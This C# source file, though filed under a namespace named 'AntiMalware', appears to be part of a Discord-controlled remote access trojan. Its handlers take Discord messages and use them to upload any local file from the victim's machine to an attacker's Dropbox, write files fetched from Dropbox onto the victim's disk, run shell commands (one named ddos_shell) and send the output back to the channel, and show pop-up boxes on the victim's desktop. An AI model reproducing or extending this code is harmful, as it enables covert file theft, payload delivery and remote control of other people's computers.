using Discord;
using Dropbox.Api.Files;
using Discord.WebSocket;
using System.Windows;
using static System.Net.WebRequestMethods;

namespace AntiMalware
{
    internal class thread_
    {
        private text text = new text();
        private value value = new value();
        private GET GET = new GET();
        public async void dropbox_download_fun(SocketUserMessage message)
        {
            try
            {
                message.Channel.SendMessageAsync("uploading....");
                string path = text.split_sum(message.Content.Split(" "));
                string file = path.Split("\\")[path.Split("\\").Length - 1];
                file = file.Remove(file.Length - 1);
                string folder = "/";
                string lastpath = folder + file;
                MemoryStream mem = new MemoryStream(System.IO.File.ReadAllBytes(path));
                await value.dropbox_.Files.UploadAsync(lastpath, WriteMode.Overwrite.Instance, body: mem);
                message.Channel.SendMessageAsync("Success to download " + path);
            }
            catch (Exception e)
            {
                message.Channel.SendMessageAsync(e.ToString());
            }
        }
        public async void dropbox_upload_fun(SocketUserMessage message)
        {
            try
            {
                message.Channel.SendMessageAsync("downloading....");
                string path = text.split_sum(message.Content.Split(" "));
                string file = path.Split("\\")[path.Split("\\").Length - 1];
                file = "/" + file.Remove(file.Length - 1);
                Dropbox.Api.Stone.IDownloadResponse<FileMetadata> download = await value.dropbox_.Files.DownloadAsync(file);
                byte[] mem = download.GetContentAsByteArrayAsync().Result;
                FileStream m = new FileStream(path, FileMode.Create);
                m.Write(mem, 0, mem.Length);
                m.Close();
                message.Channel.SendMessageAsync("Success to upload " + path);
            }
            catch (Exception e)
            {
                message.Channel.SendMessageAsync(e.ToString());
            }
        }
        public void ddos_shell(SocketUserMessage message)
        {
            try
            {
                string[] result = GET.cmd(message, text.split_sum_for_all(message.Content.Split(" ")));
                text.Send_delay(message, result[0].Split("\n"));
                text.Send_delay(message, result[1].Split("\n"));
            }
            catch (Exception e)
            {
                message.Channel.SendMessageAsync(e.ToString());
            }
        }
        public void cmd_(SocketUserMessage message)
        {
            try
            {
                string[] result = GET.cmd(message, text.split_sum(message.Content.Split(" ")));
                text.Send_delay(message, result[0].Split("\n"));
                text.Send_delay(message, result[1].Split("\n"));
            }
            catch (Exception e)
            {
                message.Channel.SendMessageAsync(e.ToString());
            }
        }
        public void msgbox_(SocketUserMessage message)
        {
            MessageBoxResult result1 = MessageBox.Show(text.split_sum(message.Content.Split(" ")),"",MessageBoxButton.OK,MessageBoxImage.None,MessageBoxResult.None,options: MessageBoxOptions.DefaultDesktopOnly);
            if (result1 == MessageBoxResult.OK) message.Channel.SendMessageAsync("ok 선택됨");
        }
        public void msgbox_que(SocketUserMessage message)
        {
            MessageBoxResult result1 = MessageBox.Show(text.split_sum(message.Content.Split(" ")), "Question", MessageBoxButton.YesNo, MessageBoxImage.Question , MessageBoxResult.None, options : MessageBoxOptions.DefaultDesktopOnly);
            if (result1 == MessageBoxResult.Yes) message.Channel.SendMessageAsync("Yes 선택됨");
            else message.Channel.SendMessageAsync("No 선택됨");
        }
        public void msgbox_error(SocketUserMessage message)
        {
            MessageBoxResult result1 = MessageBox.Show(text.split_sum(message.Content.Split(" ")), "Error", MessageBoxButton.YesNo, MessageBoxImage.Error, MessageBoxResult.None, options: MessageBoxOptions.DefaultDesktopOnly);
            if (result1 == MessageBoxResult.Yes) message.Channel.SendMessageAsync("Yes 선택됨");
            else message.Channel.SendMessageAsync("No 선택됨");
        }
    }
}
